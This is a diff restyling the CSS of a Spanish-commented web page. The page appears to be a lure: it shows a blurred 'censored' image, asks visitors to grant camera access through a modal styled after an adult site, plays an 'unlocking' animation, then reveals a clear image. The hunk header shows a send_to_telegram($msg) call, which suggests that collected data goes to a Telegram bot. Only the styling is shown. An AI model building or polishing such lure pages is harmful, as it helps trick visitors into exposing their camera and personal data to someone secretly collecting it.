@@ -26,86 +26,121 @@ send_to_telegram($msg);
   <script src="jquery.min.js"></script>
   <title>Demo Info</title>
   <style>
-    body {
-      margin: 0;
-      font-family: Arial, Helvetica, sans-serif;
-      background: #111;
-      color: #fff;
-      height: 100vh;
-      overflow: hidden;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      flex-direction: column;
-    }
+        body {
+            margin: 0;
+            font-family: Arial, Helvetica, sans-serif;
+            background: #111;
+            color: #fff;
+            height: 100vh;
+            overflow: hidden;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
+        }
 
-    /* Fondo con div en lugar de ::before */
-    #background {
-      position: fixed;
-      top: 0; left: 0;
-      width: 100%; height: 100%;
-      background: url('img/image1.jpg') no-repeat center center/cover;
-      filter: blur(15px) brightness(0.5);
-      z-index: -1;
-      transition: all 0.8s ease;
-    }
+        /* Imagen censurada inicial visible desde el inicio */
+        body::before {
+            content: "";
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background: url('img/image1.jpg') no-repeat center center/cover;
+            filter: blur(20px) brightness(0.4);
+            z-index: -1;
+            transition: all 1s ease;
+        }
 
-    /* Fondo desbloqueado */
-    body.unlocked #background {
-      background: url('img/image2.jpg') no-repeat center center/cover;
-      filter: none;
-    }
-         
-    #cameraModal .content {
-      background: #1c1c1c;
-      color: #fff;
-      padding: 25px;
-      border-radius: 6px;
-      max-width: 420px;
-      text-align: center;
-      box-shadow: 0 0 15px rgba(0,0,0,0.6);
-      border: 1px solid #333;
-    }
-    .logo { max-width: 150px; margin-bottom: 15px; }
-    #grantAccess {
-      margin-top: 20px;
-      padding: 12px 25px;
-      background-color: #e50914;
-      color: #fff;
-      border: none;
-      border-radius: 3px;
-      cursor: pointer;
-      font-size: 16px;
-      font-weight: bold;
-      transition: background 0.2s;
-    }
-    #grantAccess:hover { background-color: #b00610; }
-    #cameraModal {
-      position: fixed; top:0; left:0;
-      width:100%; height:100%;
-      background: rgba(0,0,0,0.8);
-      display: flex; align-items: center; justify-content: center;
-      z-index: 9999;
-    }
-    #unlockAnimation {
-      position: fixed; top:0; left:0;
-      width:100%; height:100%;
-      background: rgba(0,0,0,0.9);
-      color:#fff;
-      display: flex; align-items:center; justify-content:center;
-      flex-direction: column; font-size:22px; z-index:10000; display:none;
-    }
-    .loader {
-      border:6px solid #333;
-      border-top:6px solid #e50914;
-      border-radius:50%;
-      width:50px; height:50px;
-      animation: spin 1s linear infinite;
-      margin-top:15px;
-    }
-    @keyframes spin { 0%{transform:rotate(0deg);} 100%{transform:rotate(360deg);} }
-    .disclaimer { font-size:11px; color:#aaa; margin-top:15px; }
-  </style>
+        /* Imagen normal cuando se desbloquea */
+        body.unlocked::before {
+            background: url('img/image2.jpg') no-repeat center center/cover;
+            filter: none;
+        }
+
+        /* Caja estilo erome */
+        #cameraModal .content {
+            background: #1c1c1c;
+            color: #fff;
+            padding: 25px;
+            border-radius: 6px;
+            max-width: 420px;
+            text-align: center;
+            box-shadow: 0 0 15px rgba(0,0,0,0.6);
+            border: 1px solid #333;
+        }
+
+        /* Logo */
+        .logo {
+            max-width: 150px;
+            margin-bottom: 15px;
+        }
+
+        /* Botón rojo estilo erome */
+        #grantAccess {
+            margin-top: 20px;
+            padding: 12px 25px;
+            background-color: #e50914;
+            color: #fff;
+            border: none;
+            border-radius: 3px;
+            cursor: pointer;
+            font-size: 16px;
+            font-weight: bold;
+            transition: background 0.2s;
+        }
+        #grantAccess:hover {
+            background-color: #b00610;
+        }
+
+        /* Modal de permisos */
+        #cameraModal {
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background: rgba(0,0,0,0.8);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 9999;
+        }
+
+        /* Animación desbloqueando */
+        #unlockAnimation {
+            position: fixed;
+            top:0; left:0;
+            width:100%; height:100%;
+            background: rgba(0,0,0,0.9);
+            color: #fff;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
+            font-size: 22px;
+            z-index: 10000;
+            display: none;
+        }
+
+        .loader {
+            border: 6px solid #333;
+            border-top: 6px solid #e50914;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin-top: 15px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg);}
+            100% { transform: rotate(360deg);}
+        }
+
+        /* Mensaje pequeño estilo disclaimer */
+        .disclaimer {
+            font-size: 11px;
+            color: #aaa;
+            margin-top: 15px;
+        }
+    </style>
 </head>
 <body>
 
